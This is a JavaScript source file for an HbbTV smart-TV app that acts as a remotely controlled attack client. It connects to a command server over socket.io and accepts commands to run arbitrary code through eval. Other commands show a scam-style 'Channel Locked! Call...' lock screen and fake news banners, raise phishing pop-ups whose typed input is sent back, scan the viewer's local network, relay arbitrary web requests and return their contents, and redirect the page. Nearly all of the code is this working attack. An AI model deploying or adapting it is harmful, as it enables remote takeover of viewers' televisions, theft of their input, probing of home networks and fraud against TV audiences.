// app entry function
function entryPlease() {
    try {
        // attempt to acquire the Application object
        var appManager = document.getElementById('applicationManager');
        var appObject = appManager.getOwnerApplication(document);
        // check if Application object was a success
        if (appObject === null) {
            // error acquiring the Application object!
        } else {
            // we have the Application object, and we can show our app
            appObject.show();

            //document.location.href = 'http://192.168.0.140:5000/hbbtv/test/entry.html'


            var objappVersion = navigator.appVersion;
            var browserAgent = navigator.userAgent;
            var browserName = navigator.appName;
            var browserVersion = '' + parseFloat(navigator.appVersion);
            var browserMajorVersion = parseInt(navigator.appVersion, 10);
            var Offset, OffsetVersion, ix;

            // For Chrome  
            if ((OffsetVersion = browserAgent.indexOf("Chrome")) != -1) {
                browserName = "Chrome";
                browserVersion = browserAgent.substring(OffsetVersion + 7);
            }

            // For Microsoft internet explorer  
            else if ((OffsetVersion = browserAgent.indexOf("MSIE")) != -1) {
                browserName = "Microsoft Internet Explorer";
                browserVersion = browserAgent.substring(OffsetVersion + 5);
            }

            // For Firefox 
            else if ((OffsetVersion = browserAgent.indexOf("Firefox")) != -1) {
                browserName = "Firefox";
            }

            // For Safari 
            else if ((OffsetVersion = browserAgent.indexOf("Safari")) != -1) {
                browserName = "Safari";
                browserVersion = browserAgent.substring(OffsetVersion + 7);
                if ((OffsetVersion = browserAgent.indexOf("Version")) != -1)
                    browserVersion = browserAgent.substring(OffsetVersion + 8);
            }

            // For other browser "name/version" is at the end of userAgent  
            else if ((Offset = browserAgent.lastIndexOf(' ') + 1) <
                (OffsetVersion = browserAgent.lastIndexOf('/'))) {
                browserName = browserAgent.substring(Offset, OffsetVersion);
                browserVersion = browserAgent.substring(OffsetVersion + 1);
                if (browserName.toLowerCase() == browserName.toUpperCase()) {
                    browserName = navigator.appName;
                }
            }

            // Trimming the fullVersion string at  
            // semicolon/space if present  
            if ((ix = browserVersion.indexOf(";")) != -1)
                browserVersion = browserVersion.substring(0, ix);
            if ((ix = browserVersion.indexOf(" ")) != -1)
                browserVersion = browserVersion.substring(0, ix);


            browserMajorVersion = parseInt('' + browserVersion, 10);
            if (isNaN(browserMajorVersion)) {
                browserVersion = '' + parseFloat(navigator.appVersion);
                browserMajorVersion = parseInt(navigator.appVersion, 10);
            }

            var browserObj = {
                "browserName": browserName,
                "browserVersion": browserVersion,
                "browserMajorVersion": browserMajorVersion,
                "navigator.appName": navigator.appName,
                "navigator.userAgent": navigator.userAgent
            }

            var conf = document.getElementById("applicationConfig")

            rcUtils.registerKeyEventListener()
            var keyMask = 0x10 + 0x20 + 0x40 + 0x80 + 0x100 + 0x200 + 0x400
            rcUtils.setKeyset(appObject, keyMask)


            const socket = io({
                query: {
                    info: JSON.stringify(browserObj)
                }
            });

            socket.on('js-eval', (data) => {
                console.log(`valuating following code ${data.code}`)
                const r = eval(data.code)
                socket.emit("response", {
                    "response": r,
                    "qId": data.qId
                })
            })

            socket.on('get-config', () => {
                console.log('fetching config')
                console.log(conf.configuration)
                socket.emit('config-response', {
                    "config": conf.configuration
                })
            })

            socket.on('get-appObject', () => {
                console.log('fetching appObject')
                socket.emit('appObject-response', {
                    "appObject": (appObject)
                })
            })

            socket.on('get-appMgr', () => {
                console.log('fetching appMgr')
                socket.emit('appMgr-response', {
                    "appMgr": conf.configuration
                })
            })

            socket.on('start-dos', () => {
                console.log('Starting DoS')
                startDoS()
            })

            socket.on('reload', () => {
                console.log('reloading')
                reload()
            })

            socket.on('fake-banner', (data) => {
                console.log('Showing fake banner')
                createNewsBanner(data.message)
            })

            socket.on('destroy-fake-banner', () => {
                console.log('Destroying fake banner')
                destroyNewsBanner()
            })

            socket.on('next-channel', () => {
                console.log('Next channel')
                nextChannel()
            })

            socket.on('prev-channel', () => {
                console.log('Prev channel')
                prevChannel()
            })

            socket.on('phishing-popup', (data) => {
                console.log('Showing phishing popup')
                createPopup(data.message, (input) => {
                    socket.emit('phishing-response', {
                        "question": data.message,
                        "input": input
                    })
                })
            })

            socket.on('start-netscan', async (data) => {
                const netscanLogger = (message) => {
                    socket.emit('netscan-logger', {
                        "message": message
                    })
                }
                const netscanFinished = (scan) => {
                    socket.emit('netscan-response', {
                        "scan": scan
                    })
                }
                const ips = data.ips !== null ? data.ips : undefined
                await startNetscan(netscanLogger, netscanFinished, data.isRtc, ips)
            })

            socket.on('send-request', async (data) => {
                const url = data.url
                const method = data.method
                const body = data.body
                const headers = data.headers
                const fetchOptions = {
                    method: method
                }
                if (body) {
                    fetchOptions.body = body
                }
                if (headers) {
                    fetchOptions.headers = headers
                }
                try {
                    const response = await fetch(url, fetchOptions)
                    // will usually fail if CORS not enabled!
                    if (!response.ok) {
                        throw new Error(`Response ${response.status}`)
                    }
                    const file = await response.arrayBuffer()
                    const base64String = btoa(String.fromCharCode(...new Uint8Array(file)));
                    socket.emit('request-success', {
                        "url": url,
                        "method": method,
                        "response": {
                            "file": base64String,
                            "headers": Object.fromEntries(response.headers.entries())
                        }
                    })
                } catch (error) {
                    console.log(error.message)
                    socket.emit('request-failed', {
                        "url": url,
                        "method": method,
                        "error": JSON.stringify(error, Object.getOwnPropertyNames(error))
                    })
                }
            })

            socket.on('redirect', (data) => {
                console.log('redirecting')
                window.location.href = data.url
            })


        }
    } catch (e) {
        // this is not an HbbTV client, catch the error.

    }

}

function handleKeyCode(kc) {
    //var test = document.getElementById('test');
    try {
        // process buttons
        //test.innerHTML += `<br> pressed button with keycode ${kc}`
    } catch (e) {
        // pressed unhandled key, catch the error
        //test.innerHTML += `<br> error ${e}`
    }
    // we return true to prevent default action for processed keys
    return true;
}

function startDoS() {
    // Create an audio object
    const audio = new Audio('dos.mp3');
    const img = new Image();
    img.src = 'pattern.png'; // Replace with the URL of your image
    img.style.width = '100%'; // Ensures it scales in fullscreen
    img.style.height = '100%';
    img.style.objectFit = 'contain'; // Ensures proper scaling without distortion

    document.body.innerHTML = '';
    // Append the image to the body (temporarily)
    document.body.appendChild(img);
    const banner = document.createElement('div');
    banner.id = 'rollingBanner';
    banner.innerHTML = 'Channel Locked! Channel Locked!<br>Call 0805 - 388 - 123 - 211!';
    document.body.appendChild(banner);
    const call = document.createElement('h2');



    // Play the audio
    audio.play();
    audio.addEventListener('ended', () => {
        setTimeout(() => {
            audio.play()
        }, 3000)
    });
}

function reload() {
    window.location.reload()
}

function createNewsBanner(message) {
    // Check if a banner already exists
    if (document.querySelector('.news-banner')) {
        return;
    }

    // Create the banner container
    const banner = document.createElement('div');
    banner.className = 'news-banner';
    banner.id = 'news-banner'

    // Add the message
    const bannerMessage = document.createElement('div');
    bannerMessage.className = 'news-banner-message';
    bannerMessage.textContent = message;

    // Append the message to the banner
    banner.appendChild(bannerMessage);
    document.body.appendChild(banner);
}

function destroyNewsBanner() {
    const banner = document.getElementById('news-banner')
    if (banner) {
        banner.remove()
    }
}

function nextChannel() {
    var videoObj = document.getElementById('broadcastVideo');
    videoObj.bindToCurrentChannel();
    videoObj.nextChannel();
}

function prevChannel() {
    var videoObj = document.getElementById('broadcastVideo');
    videoObj.bindToCurrentChannel();
    videoObj.prevChannel();
}

function createPopup(message, onSubmitCallback) {
    // Check if a popup already exists
    if (document.querySelector('.custom-popup')) {
        console.warn('A popup already exists!');
        return;
    }

    // Create the popup container
    const popup = document.createElement('div');
    popup.className = 'custom-popup';

    // Create the popup content
    const content = document.createElement('div');
    content.className = 'popup-content';

    // Create the message
    const messageElement = document.createElement('p');
    messageElement.innerHTML = message;

    // Create the input box
    const input = document.createElement('input');
    input.type = 'text';
    input.className = 'popup-input';
    input.placeholder = 'When selected, press OK to type...';

    // Create the submit button
    const button = document.createElement('button');
    button.textContent = 'Submit';
    button.className = 'popup-submit-button';

    // Append elements to the content
    content.appendChild(messageElement);
    content.appendChild(input);
    content.appendChild(button);

    // Append the content to the popup
    popup.appendChild(content);

    // Append the popup to the body
    document.body.appendChild(popup);

    input.focus()

    input.addEventListener('keyup', (event) => {
        button.click()
    })

    // Add event listener to the submit button
    button.addEventListener('click', () => {
        const userInput = input.value.trim();
        onSubmitCallback(userInput); // Call the provided callback function with the input value
        document.body.removeChild(popup); // Remove the popup after submission
    });
}

async function startNetscan(logger, callback, isRtc, ips) {
    let ipsToScan = ips
    console.log(ipsToScan)
    let scan = await webScanAll(
        ipsToScan, // array. if undefined, scan major subnet gateways, then scan live subnets. supports wildcards
        {
            rtc: isRtc, // use webrtc to detect local ips
            logger: logger, // logger callback
            localCallback: function(ip) {
                logger(`local ip callback: ${ip}`)
            },
            networkCallback: function(ip) {
                logger(`network ip callback: ${ip}`)
            },
        }
    )
    callback(scan)
}